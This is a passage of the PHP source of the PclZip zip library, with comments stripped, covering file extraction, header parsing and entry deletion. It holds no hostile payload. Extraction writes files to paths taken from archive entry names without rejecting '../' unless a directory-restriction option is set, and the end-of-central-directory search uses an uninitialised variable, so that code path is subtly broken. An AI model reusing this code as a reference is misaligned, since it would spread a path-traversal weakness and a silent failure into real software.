        if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	      && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

            $this->privSwapBackMagicQuotes();
            
            PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_COMPRESSION,
		                       "Filename '".$v_header['stored_filename']."' is "
			  	    	  	   ."compressed by an unsupported compression "
			  	    	  	   ."method (".$v_header['compression'].") ");

            return PclZip::errorCode();
	  }
  }
  
  if (($v_extract) && (($v_header['flag'] & 1) == 1)) {
        $v_header['status'] = 'unsupported_encryption';

        if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	      && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

            $this->privSwapBackMagicQuotes();

            PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_ENCRYPTION,
		                       "Unsupported encryption for "
			  	    	  	   ." filename '".$v_header['stored_filename']
							   ."'");

            return PclZip::errorCode();
	  }
  }

    if (($v_extract) && ($v_header['status'] != 'ok')) {
        $v_result = $this->privConvertHeader2FileInfo($v_header,
	                                        $p_file_list[$v_nb_extracted++]);
        if ($v_result != 1) {
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();
            return $v_result;
        }

        $v_extract = false;
    }
    
    if ($v_extract)
    {

      @rewind($this->zip_fd);
      if (@fseek($this->zip_fd, $v_header['offset']))
      {
        $this->privCloseFd();

        $this->privSwapBackMagicQuotes();

        PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

        return PclZip::errorCode();
      }

      if ($p_options[PCLZIP_OPT_EXTRACT_AS_STRING]) {

        $v_string = '';

        $v_result1 = $this->privExtractFileAsString($v_header, $v_string, $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted])) != 1)
        {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();

          return $v_result;
        }

        $p_file_list[$v_nb_extracted]['content'] = $v_string;

        $v_nb_extracted++;
        
        if ($v_result1 == 2) {
        	break;
        }
      }
      elseif (   (isset($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT]))
	        && ($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT])) {
        $v_result1 = $this->privExtractFileInOutput($v_header, $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result;
        }

        if ($v_result1 == 2) {
        	break;
        }
      }
      else {
        $v_result1 = $this->privExtractFile($v_header,
	                                      $p_path, $p_remove_path,
										  $p_remove_all_path,
										  $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1)
        {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();

          return $v_result;
        }

        if ($v_result1 == 2) {
        	break;
        }
      }
    }
  }

  $this->privCloseFd();
  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privExtractFile(&$p_entry, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)
{
  $v_result=1;

  if (($v_result = $this->privReadFileHeader($v_header)) != 1)
  {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if ($p_remove_all_path == true) {
      if (($p_entry['external']&0x00000010)==0x00000010) {

          $p_entry['status'] = "filtered";

          return $v_result;
      }

      $p_entry['filename'] = basename($p_entry['filename']);
  }

  else if ($p_remove_path != "")
  {
    if (PclZipUtilPathInclusion($p_remove_path, $p_entry['filename']) == 2)
    {

      $p_entry['status'] = "filtered";

      return $v_result;
    }

    $p_remove_path_size = strlen($p_remove_path);
    if (substr($p_entry['filename'], 0, $p_remove_path_size) == $p_remove_path)
    {

      $p_entry['filename'] = substr($p_entry['filename'], $p_remove_path_size);

    }
  }

  if ($p_path != '') {
    $p_entry['filename'] = $p_path."/".$p_entry['filename'];
  }
  
  if (isset($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION])) {
    $v_inclusion
    = PclZipUtilPathInclusion($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION],
                              $p_entry['filename']); 
    if ($v_inclusion == 0) {

      PclZip::privErrorLog(PCLZIP_ERR_DIRECTORY_RESTRICTION,
		                     "Filename '".$p_entry['filename']."' is "
							 ."outside PCLZIP_OPT_EXTRACT_DIR_RESTRICTION");

      return PclZip::errorCode();
    }
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }
    
    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

  if (file_exists($p_entry['filename']))
  {

    if (is_dir($p_entry['filename']))
    {

      $p_entry['status'] = "already_a_directory";
      
      if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	    && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

          PclZip::privErrorLog(PCLZIP_ERR_ALREADY_A_DIRECTORY,
		                     "Filename '".$p_entry['filename']."' is "
							 ."already used by an existing directory");

          return PclZip::errorCode();
	    }
    }
    else if (!is_writeable($p_entry['filename']))
    {

      $p_entry['status'] = "write_protected";

      if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	    && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

          PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL,
		                     "Filename '".$p_entry['filename']."' exists "
							 ."and is write protected");

          return PclZip::errorCode();
	    }
    }

    else if (filemtime($p_entry['filename']) > $p_entry['mtime'])
    {
      if (   (isset($p_options[PCLZIP_OPT_REPLACE_NEWER]))
	    && ($p_options[PCLZIP_OPT_REPLACE_NEWER]===true)) {
  	  }
	    else {
          $p_entry['status'] = "newer_exist";

          if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	        && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

              PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL,
		             "Newer version of '".$p_entry['filename']."' exists "
				    ."and option PCLZIP_OPT_REPLACE_NEWER is not selected");

              return PclZip::errorCode();
	      }
	    }
    }
    else {
    }
  }

  else {
    if ((($p_entry['external']&0x00000010)==0x00000010) || (substr($p_entry['filename'], -1) == '/'))
      $v_dir_to_check = $p_entry['filename'];
    else if (!strstr($p_entry['filename'], "/"))
      $v_dir_to_check = "";
    else
      $v_dir_to_check = dirname($p_entry['filename']);

      if (($v_result = $this->privDirCheck($v_dir_to_check, (($p_entry['external']&0x00000010)==0x00000010))) != 1) {

        $p_entry['status'] = "path_creation_fail";

        $v_result = 1;
      }
    }
  }

  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010))
    {
      if ($p_entry['compression'] == 0) {

        if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0)
        {

          $p_entry['status'] = "write_error";

          return $v_result;
        }


        $v_size = $p_entry['compressed_size'];
        while ($v_size != 0)
        {
          $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
          $v_buffer = @fread($this->zip_fd, $v_read_size);
          @fwrite($v_dest_file, $v_buffer, $v_read_size);            
          $v_size -= $v_read_size;
        }

        fclose($v_dest_file);

        touch($p_entry['filename'], $p_entry['mtime']);
        

      }
      else {
        if (($p_entry['flag'] & 1) == 1) {
          PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_ENCRYPTION, 'File \''.$p_entry['filename'].'\' is encrypted. Encrypted files are not supported.');
          return PclZip::errorCode();
        }


        if ( (!isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) 
            && (isset($p_options[PCLZIP_OPT_TEMP_FILE_ON])
                || (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
                    && ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] <= $p_entry['size'])) ) ) {
          $v_result = $this->privExtractFileUsingTempFile($p_entry, $p_options);
          if ($v_result < PCLZIP_ERR_NO_ERROR) {
            return $v_result;
          }
        }
        
        else {

        
          $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);
          
          $v_file_content = @gzinflate($v_buffer);
          unset($v_buffer);
          if ($v_file_content === FALSE) {

            $p_entry['status'] = "error";
            
            return $v_result;
          }
          
          if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) {

            $p_entry['status'] = "write_error";

            return $v_result;
          }

          @fwrite($v_dest_file, $v_file_content, $p_entry['size']);
          unset($v_file_content);

          @fclose($v_dest_file);
          
        }

        @touch($p_entry['filename'], $p_entry['mtime']);
      }

      if (isset($p_options[PCLZIP_OPT_SET_CHMOD])) {

        @chmod($p_entry['filename'], $p_options[PCLZIP_OPT_SET_CHMOD]);
      }

    }
  }

	if ($p_entry['status'] == "aborted") {
      $p_entry['status'] = "skipped";
	}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privExtractFileUsingTempFile(&$p_entry, &$p_options)
{
  $v_result=1;
      
  $v_gzip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.gz';
  if (($v_dest_file = @fopen($v_gzip_temp_name, "wb")) == 0) {
    fclose($v_file);
    PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary write mode');
    return PclZip::errorCode();
  }


  $v_binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($p_entry['compression']), Chr(0x00), time(), Chr(0x00), Chr(3));
  @fwrite($v_dest_file, $v_binary_data, 10);

  $v_size = $p_entry['compressed_size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($this->zip_fd, $v_read_size);
    @fwrite($v_dest_file, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_binary_data = pack('VV', $p_entry['crc'], $p_entry['size']);
  @fwrite($v_dest_file, $v_binary_data, 8);

  @fclose($v_dest_file);

  if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) {
    $p_entry['status'] = "write_error";
    return $v_result;
  }

  if (($v_src_file = @gzopen($v_gzip_temp_name, 'rb')) == 0) {
    @fclose($v_dest_file);
    $p_entry['status'] = "read_error";
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }


  $v_size = $p_entry['size'];
  while ($v_size != 0) {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @gzread($v_src_file, $v_read_size);
    @fwrite($v_dest_file, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }
  @fclose($v_dest_file);
  @gzclose($v_src_file);

  @unlink($v_gzip_temp_name);
  
  return $v_result;
}

function privExtractFileInOutput(&$p_entry, &$p_options)
{
  $v_result=1;

  if (($v_result = $this->privReadFileHeader($v_header)) != 1) {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }

    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010)) {
      if ($p_entry['compressed_size'] == $p_entry['size']) {

        $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);

        echo $v_buffer;
        unset($v_buffer);
      }
      else {

        $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);
        
        $v_file_content = gzinflate($v_buffer);
        unset($v_buffer);

        echo $v_file_content;
        unset($v_file_content);
      }
    }
  }

if ($p_entry['status'] == "aborted") {
    $p_entry['status'] = "skipped";
}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privExtractFileAsString(&$p_entry, &$p_string, &$p_options)
{
  $v_result=1;

  $v_header = array();
  if (($v_result = $this->privReadFileHeader($v_header)) != 1)
  {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }
    
    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010)) {
      if ($p_entry['compression'] == 0) {

        $p_string = @fread($this->zip_fd, $p_entry['compressed_size']);
      }
      else {

        $v_data = @fread($this->zip_fd, $p_entry['compressed_size']);
        
        if (($p_string = @gzinflate($v_data)) === FALSE) {
        }
      }

    }
    else {
    }
    
  }

	if ($p_entry['status'] == "aborted") {
      $p_entry['status'] = "skipped";
	}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);
    
    $v_local_header['content'] = $p_string;
    $p_string = '';

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    $p_string = $v_local_header['content'];
    unset($v_local_header['content']);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privReadFileHeader(&$p_header)
{
  $v_result=1;

  $v_binary_data = @fread($this->zip_fd, 4);
  $v_data = unpack('Vid', $v_binary_data);

  if ($v_data['id'] != 0x04034b50)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');

    return PclZip::errorCode();
  }

  $v_binary_data = fread($this->zip_fd, 26);

  if (strlen($v_binary_data) != 26)
  {
    $p_header['filename'] = "";
    $p_header['status'] = "invalid_header";

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $v_data = unpack('vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $v_binary_data);

  $p_header['filename'] = fread($this->zip_fd, $v_data['filename_len']);

  if ($v_data['extra_len'] != 0) {
    $p_header['extra'] = fread($this->zip_fd, $v_data['extra_len']);
  }
  else {
    $p_header['extra'] = '';
  }

  $p_header['version_extracted'] = $v_data['version'];
  $p_header['compression'] = $v_data['compression'];
  $p_header['size'] = $v_data['size'];
  $p_header['compressed_size'] = $v_data['compressed_size'];
  $p_header['crc'] = $v_data['crc'];
  $p_header['flag'] = $v_data['flag'];
  $p_header['filename_len'] = $v_data['filename_len'];

  $p_header['mdate'] = $v_data['mdate'];
  $p_header['mtime'] = $v_data['mtime'];
  if ($p_header['mdate'] && $p_header['mtime'])
  {
    $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
    $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
    $v_seconde = ($p_header['mtime'] & 0x001F)*2;

    $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
    $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
    $v_day = $p_header['mdate'] & 0x001F;

    $p_header['mtime'] = @mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);

  }
  else
  {
    $p_header['mtime'] = time();
  }


  $p_header['stored_filename'] = $p_header['filename'];

  $p_header['status'] = "ok";

  return $v_result;
}

function privReadCentralFileHeader(&$p_header)
{
  $v_result=1;

  $v_binary_data = @fread($this->zip_fd, 4);
  $v_data = unpack('Vid', $v_binary_data);

  if ($v_data['id'] != 0x02014b50)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');

    return PclZip::errorCode();
  }

  $v_binary_data = fread($this->zip_fd, 42);

  if (strlen($v_binary_data) != 42)
  {
    $p_header['filename'] = "";
    $p_header['status'] = "invalid_header";

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $p_header = unpack('vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $v_binary_data);

  if ($p_header['filename_len'] != 0)
    $p_header['filename'] = fread($this->zip_fd, $p_header['filename_len']);
  else
    $p_header['filename'] = '';

  if ($p_header['extra_len'] != 0)
    $p_header['extra'] = fread($this->zip_fd, $p_header['extra_len']);
  else
    $p_header['extra'] = '';

  if ($p_header['comment_len'] != 0)
    $p_header['comment'] = fread($this->zip_fd, $p_header['comment_len']);
  else
    $p_header['comment'] = '';

  if (1)
  {
    $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
    $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
    $v_seconde = ($p_header['mtime'] & 0x001F)*2;

    $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
    $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
    $v_day = $p_header['mdate'] & 0x001F;

    $p_header['mtime'] = @mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);

  }
  else
  {
    $p_header['mtime'] = time();
  }

  $p_header['stored_filename'] = $p_header['filename'];

  $p_header['status'] = 'ok';

  if (substr($p_header['filename'], -1) == '/') {
    $p_header['external'] = 0x00000010;
  }


  return $v_result;
}

function privCheckFileHeaders(&$p_local_header, &$p_central_header)
{
  $v_result=1;

	if ($p_local_header['filename'] != $p_central_header['filename']) {
	}
	if ($p_local_header['version_extracted'] != $p_central_header['version_extracted']) {
	}
	if ($p_local_header['flag'] != $p_central_header['flag']) {
	}
	if ($p_local_header['compression'] != $p_central_header['compression']) {
	}
	if ($p_local_header['mtime'] != $p_central_header['mtime']) {
	}
	if ($p_local_header['filename_len'] != $p_central_header['filename_len']) {
	}

	if (($p_local_header['flag'] & 8) == 8) {
        $p_local_header['size'] = $p_central_header['size'];
        $p_local_header['compressed_size'] = $p_central_header['compressed_size'];
        $p_local_header['crc'] = $p_central_header['crc'];
	}

  return $v_result;
}

function privReadEndCentralDir(&$p_central_dir)
{
  $v_result=1;

  $v_size = filesize($this->zipname);
  @fseek($this->zip_fd, $v_size);
  if (@ftell($this->zip_fd) != $v_size)
  {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to go to the end of the archive \''.$this->zipname.'\'');

    return PclZip::errorCode();
  }

  $v_found = 0;
  if ($v_size > 26) {
    @fseek($this->zip_fd, $v_size-22);
    if (($v_pos = @ftell($this->zip_fd)) != ($v_size-22))
    {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');

      return PclZip::errorCode();
    }

    $v_binary_data = @fread($this->zip_fd, 4);
    $v_data = @unpack('Vid', $v_binary_data);

    if ($v_data['id'] == 0x06054b50) {
      $v_found = 1;
    }

    $v_pos = ftell($this->zip_fd);
  }

  if (!$v_found) {
    if ($v_maximum_size > $v_size)
      $v_maximum_size = $v_size;
    @fseek($this->zip_fd, $v_size-$v_maximum_size);
    if (@ftell($this->zip_fd) != ($v_size-$v_maximum_size))
    {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');

      return PclZip::errorCode();
    }

    $v_pos = ftell($this->zip_fd);
    $v_bytes = 0x00000000;
    while ($v_pos < $v_size)
    {
      $v_byte = @fread($this->zip_fd, 1);

      $v_bytes = ( ($v_bytes & 0xFFFFFF) << 8) | Ord($v_byte); 

      if ($v_bytes == 0x504b0506)
      {
        $v_pos++;
        break;
      }

      $v_pos++;
    }

    if ($v_pos == $v_size)
    {

      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Unable to find End of Central Dir Record signature");

      return PclZip::errorCode();
    }
  }

  $v_binary_data = fread($this->zip_fd, 18);

  if (strlen($v_binary_data) != 18)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid End of Central Dir Record size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $v_data = unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size', $v_binary_data);

  if (($v_pos + $v_data['comment_size'] + 18) != $v_size) {

  if (0) {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT,
                       'The central dir is not at the end of the archive.'
					   .' Some trailing bytes exists after the archive.');

    return PclZip::errorCode();
  }
  }

  if ($v_data['comment_size'] != 0) {
    $p_central_dir['comment'] = fread($this->zip_fd, $v_data['comment_size']);
  }
  else
    $p_central_dir['comment'] = '';

  $p_central_dir['entries'] = $v_data['entries'];
  $p_central_dir['disk_entries'] = $v_data['disk_entries'];
  $p_central_dir['offset'] = $v_data['offset'];
  $p_central_dir['size'] = $v_data['size'];
  $p_central_dir['disk'] = $v_data['disk'];
  $p_central_dir['disk_start'] = $v_data['disk_start'];


  return $v_result;
}

function privDeleteByRule(&$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    return $v_result;
  }

  @rewind($this->zip_fd);

  $v_pos_entry = $v_central_dir['offset'];
  @rewind($this->zip_fd);
  if (@fseek($this->zip_fd, $v_pos_entry))
  {
    $this->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

    return PclZip::errorCode();
  }

  $v_header_list = array();
  $j_start = 0;
  for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)
  {

    $v_header_list[$v_nb_extracted] = array();
    if (($v_result = $this->privReadCentralFileHeader($v_header_list[$v_nb_extracted])) != 1)
    {
      $this->privCloseFd();

      return $v_result;
    }


    $v_header_list[$v_nb_extracted]['index'] = $i;

    $v_found = false;

    if (   (isset($p_options[PCLZIP_OPT_BY_NAME]))
        && ($p_options[PCLZIP_OPT_BY_NAME] != 0)) {

        for ($j=0; ($j<sizeof($p_options[PCLZIP_OPT_BY_NAME])) && (!$v_found); $j++) {

            if (substr($p_options[PCLZIP_OPT_BY_NAME][$j], -1) == "/") {

                if (   (strlen($v_header_list[$v_nb_extracted]['stored_filename']) > strlen($p_options[PCLZIP_OPT_BY_NAME][$j]))
                    && (substr($v_header_list[$v_nb_extracted]['stored_filename'], 0, strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_found = true;
                }
                elseif (   (($v_header_list[$v_nb_extracted]['external']&0x00000010)==0x00000010) 
                        && ($v_header_list[$v_nb_extracted]['stored_filename'].'/' == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_found = true;
                }
            }
            elseif ($v_header_list[$v_nb_extracted]['stored_filename'] == $p_options[PCLZIP_OPT_BY_NAME][$j]) {
                $v_found = true;
            }
        }
    }


    else if (   (isset($p_options[PCLZIP_OPT_BY_PREG]))
             && ($p_options[PCLZIP_OPT_BY_PREG] != "")) {

        if (preg_match($p_options[PCLZIP_OPT_BY_PREG], $v_header_list[$v_nb_extracted]['stored_filename'])) {
            $v_found = true;
        }
    }

    else if (   (isset($p_options[PCLZIP_OPT_BY_INDEX]))
             && ($p_options[PCLZIP_OPT_BY_INDEX] != 0)) {

        for ($j=$j_start; ($j<sizeof($p_options[PCLZIP_OPT_BY_INDEX])) && (!$v_found); $j++) {

            if (($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['start']) && ($i<=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end'])) {
                $v_found = true;
            }
            if ($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']) {
                $j_start = $j+1;
            }

            if ($p_options[PCLZIP_OPT_BY_INDEX][$j]['start']>$i) {
                break;
            }
        }
    }
    else {
    	$v_found = true;
    }

    if ($v_found)
    {
      unset($v_header_list[$v_nb_extracted]);
    }
    else
    {
      $v_nb_extracted++;
    }
  }

  if ($v_nb_extracted > 0) {

      $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

      $v_temp_zip = new PclZip($v_zip_temp_name);

      if (($v_result = $v_temp_zip->privOpenFd('wb')) != 1) {
          $this->privCloseFd();

          return $v_result;
      }

      for ($i=0; $i<sizeof($v_header_list); $i++) {

          @rewind($this->zip_fd);
          if (@fseek($this->zip_fd,  $v_header_list[$i]['offset'])) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

              return PclZip::errorCode();
          }

          $v_local_header = array();
          if (($v_result = $this->privReadFileHeader($v_local_header)) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }
          
          if ($this->privCheckFileHeaders($v_local_header,
		                                $v_header_list[$i]) != 1) {
          }
          unset($v_local_header);

          if (($v_result = $v_temp_zip->privWriteFileHeader($v_header_list[$i])) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }

          if (($v_result = PclZipUtilCopyBlock($this->zip_fd, $v_temp_zip->zip_fd, $v_header_list[$i]['compressed_size'])) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }
      }

      $v_offset = @ftell($v_temp_zip->zip_fd);

      for ($i=0; $i<sizeof($v_header_list); $i++) {
          if (($v_result = $v_temp_zip->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
              $v_temp_zip->privCloseFd();
              $this->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }

          $v_temp_zip->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
      }


      $v_comment = '';
      if (isset($p_options[PCLZIP_OPT_COMMENT])) {
        $v_comment = $p_options[PCLZIP_OPT_COMMENT];
      }

      $v_size = @ftell($v_temp_zip->zip_fd)-$v_offset;

      if (($v_result = $v_temp_zip->privWriteCentralHeader(sizeof($v_header_list), $v_size, $v_offset, $v_comment)) != 1) {
          unset($v_header_list);
          $v_temp_zip->privCloseFd();
          $this->privCloseFd();
          @unlink($v_zip_temp_name);

          return $v_result;
      }

      $v_temp_zip->privCloseFd();
      $this->privCloseFd();

      @unlink($this->zipname);

      PclZipUtilRename($v_zip_temp_name, $this->zipname);
  
      unset($v_temp_zip);
  }
  
  else if ($v_central_dir['entries'] != 0) {
      $this->privCloseFd();

      if (($v_result = $this->privOpenFd('wb')) != 1) {
        return $v_result;
      }

      if (($v_result = $this->privWriteCentralHeader(0, 0, 0, '')) != 1) {
        return $v_result;
      }

      $this->privCloseFd();
  }

  return $v_result;
}

function privDirCheck($p_dir, $p_is_dir=false)
{
  $v_result = 1;


  if (($p_is_dir) && (substr($p_dir, -1)=='/'))
  {
    $p_dir = substr($p_dir, 0, strlen($p_dir)-1);
  }

  if ((is_dir($p_dir)) || ($p_dir == ""))
  {
    return 1;
  }

  $p_parent_dir = dirname($p_dir);

  if ($p_parent_dir != $p_dir)
  {
    if ($p_parent_dir != "")
    {
      if (($v_result = $this->privDirCheck($p_parent_dir)) != 1)
      {
        return $v_result;
      }
    }
  }

  if (!@mkdir($p_dir, 0777))
  {
